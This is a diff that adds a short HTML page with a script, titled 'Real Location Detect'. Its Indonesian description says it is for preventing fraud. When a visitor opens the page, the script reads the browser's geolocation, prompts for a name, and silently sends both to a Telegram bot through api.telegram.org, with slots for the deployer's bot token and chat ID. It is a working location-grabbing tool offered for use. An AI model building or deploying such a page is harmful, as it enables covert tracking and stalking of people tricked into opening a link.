@@ -1,0 +1,38 @@
+<title>Real Location Detect</title>
+Description : Pemakaian untuk mencegah kecurangan / Penipuan dan mendapatkan Lokasi real.
+<script>
+  if("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      var lat = position.coords.latitude;
+   var long = position.coords.longitude;
+   var name = prompt('Nama kau :');
+   var tokenBot = '13377777:xxxxxxxxxxxxxx'; // Your "tokenBot" Here
+var chatId = '137777'; // Your "chatId" Here
+
+/*
+     _____    _     __   __  ___  
+  ______                       __             ______                                   
+ /      \                     /  |           /      \                                  
+/$$$$$$  |  ______    ______  $$ |  ______  /$$$$$$  |  ______   ______   _____  ____  
+$$ | _$$/  /      \  /      \ $$ | /      \ $$ | _$$/  /      \ /      \ /     \/    \ 
+$$ |/    |/$$$$$$  |/$$$$$$  |$$ |/$$$$$$  |$$ |/    |/$$$$$$  |$$$$$$  |$$$$$$ $$$$  |
+$$ |$$$$ |$$    $$ |$$ |  $$ |$$ |$$ |  $$ |$$ |$$$$ |$$ |  $$/ /    $$ |$$ | $$ | $$ |
+$$ \__$$ |$$$$$$$$/ $$ \__$$ |$$ |$$ \__$$ |$$ \__$$ |$$ |     /$$$$$$$ |$$ | $$ | $$ |
+$$    $$/ $$       |$$    $$/ $$ |$$    $$/ $$    $$/ $$ |     $$    $$ |$$ | $$ | $$ |
+ $$$$$$/   $$$$$$$/  $$$$$$/  $$/  $$$$$$/   $$$$$$/  $$/       $$$$$$$/ $$/  $$/  $$/ 
+                                                                                       
+                                                                                       
+                                                                                       
+  ---- Telegram Bot Geolocation ----
+*/
+
+function telegramSend(tokenBot, chatId) {
+ var textData = 'Nama : ' + name + '%0d%0aLokasi : http://maps.google.com/?q=' + lat + ',' + long;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://api.telegram.org/bot' + tokenBot + '/sendMessage?chat_id=' + chatId + '&text=' + textData + '&parse_mode=html', true);
+    xhr.send();
+}
+telegramSend(tokenBot, chatId)
+    });
+  }
+</script>
